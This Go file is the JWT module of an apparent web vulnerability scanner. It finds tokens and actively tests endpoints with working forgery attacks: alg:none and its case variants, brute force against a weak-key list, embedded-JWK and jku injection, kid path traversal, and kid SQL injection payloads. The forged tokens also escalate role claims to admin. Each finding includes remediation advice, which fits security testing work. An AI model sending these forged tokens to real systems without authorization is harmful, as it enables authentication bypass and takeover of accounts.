package jwt

import (
	"context"
	"crypto"
	"crypto/hmac"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/sha512"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"math/big"
	"net/http"
	"regexp"
	"strings"

	"github.com/erebus/scanner/internal/client"
	"github.com/erebus/scanner/internal/crawler"
	"github.com/erebus/scanner/internal/modules"
)

var jwtRe = regexp.MustCompile(`\beyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_.+/=]*\b`)

var weakKeys = []string{
	"", "secret", "password", "123456", "key", "none",
	"changeme", "letmein", "admin", "default", "jwt_secret",
	"your-256-bit-secret", "super-secret", "privatekey", "secretkey",
	"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx",
	"insecure", "test", "dev", "production", "api_key", "token",
}

type Module struct {
	client *client.Client
}

func New(c *client.Client) *Module { return &Module{client: c} }
func (m *Module) Name() string     { return "jwt" }

func (m *Module) Run(ctx context.Context, page crawler.Page) ([]modules.Finding, error) {
	var findings []modules.Finding
	seen := make(map[string]struct{})

	tokens := jwtRe.FindAllString(string(page.Body), -1)
	for _, setCookie := range page.Headers["Set-Cookie"] {
		tokens = append(tokens, jwtRe.FindAllString(setCookie, -1)...)
	}
	for _, authHeader := range page.Headers["Authorization"] {
		tokens = append(tokens, jwtRe.FindAllString(authHeader, -1)...)
	}

	for _, token := range tokens {
		if ctx.Err() != nil {
			break
		}
		if _, ok := seen[token]; ok {
			continue
		}
		seen[token] = struct{}{}
		findings = append(findings, m.analyzeToken(ctx, page.URL, token)...)
	}
	return findings, nil
}

func (m *Module) analyzeToken(ctx context.Context, pageURL, token string) []modules.Finding {
	var findings []modules.Finding

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return nil
	}

	headerBytes, err := base64.RawURLEncoding.DecodeString(parts[0])
	if err != nil {
		return nil
	}
	payloadBytes, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		return nil
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil
	}
	var payload map[string]interface{}
	json.Unmarshal(payloadBytes, &payload)

	alg, _ := header["alg"].(string)
	payloadJSON, _ := json.MarshalIndent(payload, "", "  ")

	findings = append(findings, modules.Finding{
		Module:    "jwt",
		Severity:  modules.Info,
		URL:       pageURL,
		Param:     "token",
		Payload:   token,
		Evidence:    fmt.Sprintf("JWT found — alg=%s", alg),
		Detail:      "JWT token exposed in response",
		CWE:         "CWE-347",
		CVSS:        3.7,
		CVSSVector:  "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N",
		Confidence:  modules.Confirmed,
		Remediation: "Review the token payload for sensitive claims; use short expiry times; rotate tokens regularly",
		Tags:        []string{"jwt", "info-disclosure", "session"},
		Extracted:   string(payloadJSON),
	})

	// Attack 1: alg:none (normal) + case variants and jku/x5u injection (deep)
	if alg != "" && strings.ToLower(alg) != "none" {
		if f := m.tryAlgNone(ctx, pageURL, parts[1], payload); f != nil {
			findings = append(findings, *f)
		}
		if modules.GetMode(ctx) == modules.ModeDeep {
			findings = append(findings, m.tryAlgNoneCaseVariants(ctx, pageURL, parts[1], payload)...)
			if f := m.tryJKUinjection(ctx, pageURL, parts[1], payload); f != nil {
				findings = append(findings, *f)
			}
		}
	}

	// Attack 2: weak HMAC key brute force
	if strings.HasPrefix(strings.ToUpper(alg), "HS") {
		if crackedKey := bruteForceHMACKey(parts[0]+"."+parts[1], parts[2], alg); crackedKey != "" {
			findings = append(findings, modules.Finding{
				Module:      "jwt",
				Severity:    modules.Critical,
				URL:         pageURL,
				Param:       "token",
				Payload:     token,
				Evidence:    fmt.Sprintf("HMAC signing key cracked: %q", crackedKey),
				Detail:      fmt.Sprintf("JWT weak signing key — %s key is %q; forge arbitrary tokens", alg, crackedKey),
				CWE:         "CWE-347",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Use a cryptographically strong random key ≥256 bits; rotate immediately",
				Tags:        []string{"jwt", "weak-key", "auth-bypass"},
				Extracted:   string(payloadJSON),
			})
		}
	}

	// Attack 3: RS256 → HS256 confusion
	if strings.HasPrefix(strings.ToUpper(alg), "RS") || strings.HasPrefix(strings.ToUpper(alg), "ES") {
		findings = append(findings, modules.Finding{
			Module:     "jwt",
			Severity:   modules.Medium,
			URL:        pageURL,
			Param:      "token",
			Payload:    token,
			Evidence:   fmt.Sprintf("Asymmetric algorithm %s — test algorithm confusion (RS256→HS256 with public key as HMAC secret)", alg),
			Detail:     "JWT algorithm confusion: obtain server public key and resign token as HS256 using public key as HMAC secret",
			CWE:         "CWE-347",
			CVSS:        8.1,
			CVSSVector:  "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
			Confidence:  modules.Potential,
			Remediation: "Enforce a per-key algorithm allowlist server-side; never trust the client-supplied 'alg' header; use a library that binds algorithm to key type",
			Tags:        []string{"jwt", "alg-confusion", "auth-bypass"},
		})
	}

	// Attack 4: embedded JWK (CVE-2018-0114 class)
	if strings.HasPrefix(strings.ToUpper(alg), "RS") {
		if f := m.tryEmbeddedJWK(ctx, pageURL, parts[1], payload); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 5: kid path traversal (CVE-2017-17405 class)
	if _, hasKid := header["kid"]; hasKid || alg != "" {
		if f := m.tryKidPathTraversal(ctx, pageURL, parts[1], payload); f != nil {
			findings = append(findings, *f)
		}
	}

	// Attack 6: kid SQL injection
	if kid, ok := header["kid"].(string); ok && kid != "" {
		if f := m.tryKidSQLi(ctx, pageURL, parts[1], payload, kid); f != nil {
			findings = append(findings, *f)
		}
	}

	return findings
}

// endpointIsPublic returns true when the URL returns 200 + non-HTML content without any
// authentication — confirming it is publicly accessible and auth bypass cannot be confirmed.
func (m *Module) endpointIsPublic(ctx context.Context, pageURL string) bool {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
	if err != nil {
		return false
	}
	resp, err := m.client.DoNoAuth(req)
	if err != nil {
		return false
	}
	body, _ := client.ReadBody(resp)
	return resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body)
}

func (m *Module) tryAlgNone(ctx context.Context, pageURL, rawPayload string, originalPayload map[string]interface{}) *modules.Finding {
	// Skip if endpoint is publicly accessible — bypass can't be confirmed without auth requirement.
	if m.endpointIsPublic(ctx, pageURL) {
		return nil
	}

	noneHeader := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"none","typ":"JWT"}`))
	noneToken := noneHeader + "." + rawPayload + "."

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("Authorization", "Bearer "+noneToken)
	resp, err := m.client.DoNoAuth(req)
	if err != nil {
		return nil
	}
	body, _ := client.ReadBody(resp)

	if resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body) {
		payloadJSON, _ := json.MarshalIndent(originalPayload, "", "  ")
		return &modules.Finding{
			Module:      "jwt",
			Severity:    modules.Critical,
			URL:         pageURL,
			Param:       "Authorization",
			Payload:     noneToken,
			Evidence:    fmt.Sprintf("HTTP 200 with alg:none token — signature validation bypassed (%d bytes, non-HTML)", len(body)),
			Detail:      "JWT alg:none bypass — server accepted unsigned token",
			CWE:         "CWE-347",
			CVSS:        9.8,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			Confidence:  modules.Confirmed,
			Remediation: "Explicitly reject alg:none; use an allow-list of permitted algorithms",
			Tags:        []string{"jwt", "alg-none", "auth-bypass"},
			Extracted:   string(payloadJSON),
			Request:     "GET " + pageURL + "\nAuthorization: Bearer " + noneToken,
		}
	}
	return nil
}

// tryEmbeddedJWK generates a fresh RSA key pair, embeds the public key as a `jwk`
// claim in the JWT header, and signs the token with the private key. If the server
// validates using the embedded JWK instead of a pinned key set, it accepts our token.
func (m *Module) tryEmbeddedJWK(ctx context.Context, pageURL, rawPayload string, originalPayload map[string]interface{}) *modules.Finding {
	if m.endpointIsPublic(ctx, pageURL) {
		return nil
	}

	privKey, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil
	}
	pub := &privKey.PublicKey

	nBytes := pub.N.Bytes()
	eBytes := big.NewInt(int64(pub.E)).Bytes()
	jwk := map[string]interface{}{
		"kty": "RSA",
		"n":   base64.RawURLEncoding.EncodeToString(nBytes),
		"e":   base64.RawURLEncoding.EncodeToString(eBytes),
	}

	headerMap := map[string]interface{}{
		"alg": "RS256",
		"jwk": jwk,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)

	escalated := copyMap(originalPayload)
	elevatePrivileges(escalated)
	escalatedJSON, _ := json.Marshal(escalated)
	payloadB64 := base64.RawURLEncoding.EncodeToString(escalatedJSON)

	sigInput := headerB64 + "." + payloadB64
	h := crypto.SHA256.New()
	h.Write([]byte(sigInput))
	sig, err := rsa.SignPKCS1v15(rand.Reader, privKey, crypto.SHA256, h.Sum(nil))
	if err != nil {
		return nil
	}
	forgedToken := sigInput + "." + base64.RawURLEncoding.EncodeToString(sig)

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("Authorization", "Bearer "+forgedToken)
	resp, err := m.client.DoNoAuth(req)
	if err != nil {
		return nil
	}
	body, _ := client.ReadBody(resp)

	if resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body) {
		return &modules.Finding{
			Module:      "jwt",
			Severity:    modules.Critical,
			URL:         pageURL,
			Param:       "Authorization",
			Payload:     forgedToken[:80] + "...",
			Evidence:    fmt.Sprintf("HTTP 200 with embedded-JWK forged token — server validated against jwk header claim (%d bytes, non-HTML)", len(body)),
			Detail:      "JWT embedded JWK injection (CVE-2018-0114 class): server validated the token's signature using the public key embedded in the `jwk` header claim rather than a pinned key set, allowing attackers to forge arbitrary tokens",
			CWE:         "CWE-347",
			CVSS:        9.8,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			Confidence:  modules.Confirmed,
			Remediation: "Never accept keys from within the JWT itself; validate signatures against a pinned, server-controlled JWK Set (JWKS) only",
			Tags:        []string{"jwt", "jwk-injection", "auth-bypass", "privilege-escalation"},
		}
	}
	return nil
}

// tryKidPathTraversal signs a token with kid pointing to /dev/null (empty content → empty HMAC key).
func (m *Module) tryKidPathTraversal(ctx context.Context, pageURL, rawPayload string, originalPayload map[string]interface{}) *modules.Finding {
	if m.endpointIsPublic(ctx, pageURL) {
		return nil
	}

	kidPaths := []string{
		"../../dev/null",
		"../../../dev/null",
		"/dev/null",
		"../../../../../../dev/null",
	}
	emptyKey := []byte("")

	for _, kidPath := range kidPaths {
		if ctx.Err() != nil {
			break
		}
		headerMap := map[string]interface{}{
			"alg": "HS256",
			"kid": kidPath,
		}
		headerJSON, _ := json.Marshal(headerMap)
		headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)

		escalated := copyMap(originalPayload)
		elevatePrivileges(escalated)
		escalatedJSON, _ := json.Marshal(escalated)
		payloadB64 := base64.RawURLEncoding.EncodeToString(escalatedJSON)

		sigInput := headerB64 + "." + payloadB64
		mac := hmac.New(sha256.New, emptyKey)
		mac.Write([]byte(sigInput))
		sig := mac.Sum(nil)
		forgedToken := sigInput + "." + base64.RawURLEncoding.EncodeToString(sig)

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+forgedToken)
		resp, err := m.client.DoNoAuth(req)
		if err != nil {
			continue
		}
		body, _ := client.ReadBody(resp)

		if resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body) {
			return &modules.Finding{
				Module:      "jwt",
				Severity:    modules.Critical,
				URL:         pageURL,
				Param:       "Authorization (kid path traversal)",
				Payload:     forgedToken[:80] + "...",
				Evidence:    fmt.Sprintf("HTTP 200 with kid=%q — path traversal to /dev/null, empty HMAC key accepted (%d bytes, non-HTML)", kidPath, len(body)),
				Detail:      "JWT kid path traversal: the `kid` header is used as a filesystem path to load the HMAC signing key. By pointing it to /dev/null, the secret becomes an empty string, allowing token forgery.",
				CWE:         "CWE-22",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Validate and sanitize the `kid` claim; use a key identifier (not a path); store keys in a key store, not the filesystem",
				Tags:        []string{"jwt", "kid-path-traversal", "auth-bypass"},
			}
		}
	}
	return nil
}

// tryKidSQLi injects SQL into the `kid` header, signing with a predictable key value
// that the UNION SELECT returns. Works against SQL-backed key stores.
func (m *Module) tryKidSQLi(ctx context.Context, pageURL, rawPayload string, originalPayload map[string]interface{}, originalKid string) *modules.Finding {
	if m.endpointIsPublic(ctx, pageURL) {
		return nil
	}

	const sqliKey = "erebus_sqli_jwt_key"

	kidPayloads := []string{
		fmt.Sprintf(`%s' UNION SELECT '%s'-- -`, originalKid, sqliKey),
		fmt.Sprintf(`%s" UNION SELECT "%s"-- -`, originalKid, sqliKey),
		fmt.Sprintf(`x' UNION SELECT '%s'-- -`, sqliKey),
		fmt.Sprintf(`x" UNION SELECT "%s"-- -`, sqliKey),
	}

	for _, kidSQL := range kidPayloads {
		if ctx.Err() != nil {
			break
		}
		headerMap := map[string]interface{}{
			"alg": "HS256",
			"kid": kidSQL,
		}
		headerJSON, _ := json.Marshal(headerMap)
		headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)

		escalated := copyMap(originalPayload)
		elevatePrivileges(escalated)
		escalatedJSON, _ := json.Marshal(escalated)
		payloadB64 := base64.RawURLEncoding.EncodeToString(escalatedJSON)

		sigInput := headerB64 + "." + payloadB64
		mac := hmac.New(sha256.New, []byte(sqliKey))
		mac.Write([]byte(sigInput))
		sig := mac.Sum(nil)
		forgedToken := sigInput + "." + base64.RawURLEncoding.EncodeToString(sig)

		req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+forgedToken)
		resp, err := m.client.DoNoAuth(req)
		if err != nil {
			continue
		}
		body, _ := client.ReadBody(resp)

		if resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body) {
			return &modules.Finding{
				Module:      "jwt",
				Severity:    modules.Critical,
				URL:         pageURL,
				Param:       "Authorization (kid SQLi)",
				Payload:     kidSQL,
				Evidence:    fmt.Sprintf("HTTP 200 with SQL-injected kid claim — UNION SELECT returned controlled key %q, token accepted (%d bytes, non-HTML)", sqliKey, len(body)),
				Detail:      "JWT kid SQL injection: the `kid` header is interpolated unsanitized into a SQL query used to retrieve the HMAC signing key. By injecting UNION SELECT, attacker controls the key, enabling token forgery.",
				CWE:         "CWE-89",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Use parameterized queries when looking up JWT keys by kid; validate kid against an allow-list",
				Tags:        []string{"jwt", "kid-sqli", "sqli", "auth-bypass"},
			}
		}
	}
	return nil
}

// tryAlgNoneCaseVariants tries upper/mixed-case variants of "none" that bypass naive allow-lists.
// e.g. "NONE", "None", "nOnE" — some libraries do a case-sensitive string comparison.
func (m *Module) tryAlgNoneCaseVariants(ctx context.Context, pageURL, rawPayload string, originalPayload map[string]interface{}) []modules.Finding {
	if m.endpointIsPublic(ctx, pageURL) {
		return nil
	}
	variants := []string{"NONE", "None", "nOnE", "nONE", "NoNe"}
	var findings []modules.Finding
	for _, algVariant := range variants {
		if ctx.Err() != nil {
			break
		}
		h := base64.RawURLEncoding.EncodeToString([]byte(`{"alg":"` + algVariant + `","typ":"JWT"}`))
		tok := h + "." + rawPayload + "."
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
		if err != nil {
			continue
		}
		req.Header.Set("Authorization", "Bearer "+tok)
		resp, err := m.client.DoNoAuth(req)
		if err != nil {
			continue
		}
		body, _ := client.ReadBody(resp)
		if resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body) {
			payloadJSON, _ := json.MarshalIndent(originalPayload, "", "  ")
			findings = append(findings, modules.Finding{
				Module:      "jwt",
				Severity:    modules.Critical,
				URL:         pageURL,
				Param:       "Authorization",
				Payload:     tok,
				Evidence:    fmt.Sprintf("HTTP 200 with alg:%q (case variant of none) — case-insensitive check bypassed (%d bytes)", algVariant, len(body)),
				Detail:      fmt.Sprintf("JWT alg:none case-variant bypass: the library performs a case-sensitive check for 'none', allowing %q to skip signature validation", algVariant),
				CWE:         "CWE-347",
				CVSS:        9.8,
				CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
				Confidence:  modules.Confirmed,
				Remediation: "Use a case-insensitive comparison when blocking alg:none; prefer an allow-list of accepted algorithms over a block-list",
				Tags:        []string{"jwt", "alg-none", "auth-bypass", "case-bypass"},
				Extracted:   string(payloadJSON),
			})
			break
		}
	}
	return findings
}

// tryJKUinjection reports a jku/x5u header injection potential.
// We cannot host a live JWKS endpoint, so this is a Potential finding that instructs
// the tester to verify manually with a controlled server (Burp Collaborator, etc.).
func (m *Module) tryJKUinjection(ctx context.Context, pageURL, rawPayload string, originalPayload map[string]interface{}) *modules.Finding {
	if m.endpointIsPublic(ctx, pageURL) {
		return nil
	}
	// Build a token with a jku header pointing to an attacker domain
	const attackerJWKS = "https://erebus-jwks-test.invalid/.well-known/jwks.json"
	headerMap := map[string]interface{}{
		"alg": "RS256",
		"jku": attackerJWKS,
	}
	headerJSON, _ := json.Marshal(headerMap)
	headerB64 := base64.RawURLEncoding.EncodeToString(headerJSON)
	forgedToken := headerB64 + "." + rawPayload + ".AAAAAA"

	req, err := http.NewRequestWithContext(ctx, http.MethodGet, pageURL, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("Authorization", "Bearer "+forgedToken)
	resp, err := m.client.DoNoAuth(req)
	if err != nil {
		return nil
	}
	body, _ := client.ReadBody(resp)
	// If server returns 200 non-HTML (it accepted the token), the jku was followed
	if resp.StatusCode == http.StatusOK && len(body) > 100 && !isHTMLBody(body) {
		return &modules.Finding{
			Module:      "jwt",
			Severity:    modules.Critical,
			URL:         pageURL,
			Param:       "Authorization (jku injection)",
			Payload:     forgedToken[:80] + "...",
			Evidence:    fmt.Sprintf("HTTP 200 with jku-injected token pointing to %s — server may have fetched attacker JWKS (%d bytes, non-HTML)", attackerJWKS, len(body)),
			Detail:      "JWT jku (JSON Web Key Set URL) injection: the server accepted a token whose `jku` header pointed to an attacker-controlled domain. If the server fetched the JWKS from that URL to verify the signature, an attacker can forge arbitrary tokens with a self-signed key. Verify with OOB callback (Burp Collaborator).",
			CWE:         "CWE-347",
			CVSS:        9.8,
			CVSSVector:  "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
			Confidence:  modules.Likely,
			Remediation: "Pin the JWKS URL in server configuration; never accept key material from within the token itself (jku, x5u, jwk claims)",
			Tags:        []string{"jwt", "jku-injection", "auth-bypass", "ssrf"},
		}
	}
	return nil
}

func isHTMLBody(body []byte) bool {
	if len(body) == 0 {
		return false
	}
	n := len(body)
	if n > 100 {
		n = 100
	}
	peek := strings.TrimSpace(strings.ToLower(string(body[:n])))
	return strings.HasPrefix(peek, "<!doctype html") || strings.HasPrefix(peek, "<html")
}

func bruteForceHMACKey(signingInput, signatureB64, alg string) string {
	sigBytes, err := base64.RawURLEncoding.DecodeString(signatureB64)
	if err != nil {
		return ""
	}
	hashFn := sha256.New
	switch strings.ToUpper(alg) {
	case "HS384":
		hashFn = sha512.New384
	case "HS512":
		hashFn = sha512.New
	}
	for _, key := range weakKeys {
		mac := hmac.New(hashFn, []byte(key))
		mac.Write([]byte(signingInput))
		if hmac.Equal(mac.Sum(nil), sigBytes) {
			return key
		}
	}
	return ""
}

func copyMap(m map[string]interface{}) map[string]interface{} {
	out := make(map[string]interface{}, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

func elevatePrivileges(m map[string]interface{}) {
	if _, ok := m["role"]; ok {
		m["role"] = "admin"
	}
	if _, ok := m["admin"]; ok {
		m["admin"] = true
	}
	if _, ok := m["is_admin"]; ok {
		m["is_admin"] = true
	}
	if _, ok := m["isAdmin"]; ok {
		m["isAdmin"] = true
	}
	if _, ok := m["scope"]; ok {
		m["scope"] = "admin:read admin:write"
	}
}
